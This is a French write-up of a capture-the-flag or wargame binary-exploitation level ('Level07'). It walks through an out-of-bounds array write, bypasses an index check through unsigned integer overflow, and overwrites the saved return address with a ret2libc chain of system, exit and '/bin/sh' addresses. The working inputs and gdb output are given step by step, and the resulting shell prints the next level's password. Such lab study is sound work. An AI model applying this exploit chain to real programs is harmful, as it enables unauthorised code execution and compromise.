# Level07

## Analyse

- On a ici une fonction main qui declare un tableau d'unsigned int de 100 elements et un buffer de 20 char.

- On a au debut de la fonction une suppression des argv et de l'env.

- Ensuite une boucle while(1) qui attend en entree les commandes via `strcmp()` :
    - store : qui va call `store_number()` avec en parametre le tab data.
    - read : qui va call `read_number()` avec en parametre le tab data.
    - quit : qui va break la boucle.

- On a un memset en fin de boucle pour reinitialiser le buffer commande.

- Store_number :
    - declare deux unsigned int number et index
    - Call `scanf()` deux fois via la fonction `get_unum()` pour recuperer le nombre et l'index a store dans le tab data.
    - Avant cette operation il y a une verification : si l'index % 3 == 0 ou number >> 24 == 0xb7 alors return 1.
    - Si cette verification est passee store alors `data[index] = number`.

- Read_number :
    - declare un unsigned int index
    - initialise cette variable avec un call a `scanf()` via la fonction `get_unum()`
    - Ensuite va read l'element a l'index donne dans le tab data.

## Exploitation

- Deja on observe qu'il n'y a pas de protection d'index lors du `store_number()` :

```
Input command: store
Number: 1
Index: 107
Completed  command successfully
```

- Cela nous permet d'overflow le tab et de read la stack

- En parcourant les index on a observe que l'index 114 est : `4158936339`
    - En hexadecimal cela donne : `F7E45513` qui correspond a notre saved eip du main : `saved eip 0xf7e45513`
    - Malheureusement nous ne pouvons pas acceder a l'index 114 car rentre dans la condition index % 3 :

```
Input command: store
Number: 1 
Index: 114
*** ERROR! ***
This index is reserved for wil!
*** ERROR! ***
Failed to do store command
```

- Bon il va falloir trouver une solution pour contourner ces protections : 
    - Dans le code disas on observe des left shift bits de 2 (qui correspond a un *4) :
```
shl     eax, 0x2
```

- Notamment dans la fonction `store_number()` et `read_number()`. Ces multiplications par 4 sont la pour calculer le decalage dans le tab car les valeurs en int : `sizeof(int) = 4 bytes`.

- Cela signifie que pour acceder aux index du tableau il est force a multiplie par 4 pour acceder au bon index.

- La vérification `index % 3` se fait sur l'index original, pas sur le résultat après multiplication.

- Maintenant que l'on sait cela, on peut chercher une valeur qui multiplie par 4 va overflow le unsigned int et donner 114.

- Prenons le u_int max, divisons le par 4 et ajoutons 114 :
    - 4,294,967,296 / 4 + 114 = 1073741938

```
Input command: store
 Number: 1
 Index: 1073741938
 Completed store command successfully
Input command: read
 Index: 114
 Number at data[114] is 1
 Completed read command successfully
```

- Nous avons donc reussi a modifier notre index 114. Cela nous laisse 3 espaces contigus : 114, 115, 116.

- En reflechissant 2 minutes on peut penser a un ret2libc qui implique 3 adresses : `system()`, `exit()`, `"/bin/sh"`.

- Allons trouver ces adresses :

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) info pro
proc     program  
(gdb) info proc mappings 
process 1747
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/users/level07/level07
         0x8049000  0x804a000     0x1000     0x1000 /home/users/level07/level07
         0x804a000  0x804b000     0x1000     0x2000 /home/users/level07/level07
        0xf7e2b000 0xf7e2c000     0x1000        0x0 
        0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
        0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
        0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
        0xf7fd0000 0xf7fd4000     0x4000        0x0 
        0xf7fda000 0xf7fdb000     0x1000        0x0 
        0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
        0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
        0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
        0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
        0xfffdd000 0xffffe000    0x21000        0x0 [stack]

(gdb) find 0xf7e2c000, +0x1a0000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

- Cast en unsigned int : 

```
0x f7e6aed0 = 4159090384 system 114 1073741938
0x f7e5eb70 = 4159040368 exit   115
0x f7f897ec = 4160264172 bin/sh 116
```

- Essayons maintenant d'entrer ces valeurs dans le programme : 

```
Input command: store
Number: 4159090384
Index: 1073741938
Completed store command successfully
Input command: store
Number: 4159040368
Index: 115
Completed store command successfully
Input command: store
Number: 4160264172
Index: 116
Completed store command successfully
```

- Plus qu'a quitter la boucle while avec la commande quit pour rediriger le flux d'execution vers notre `ret2libc` :

```
Input command: quit
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```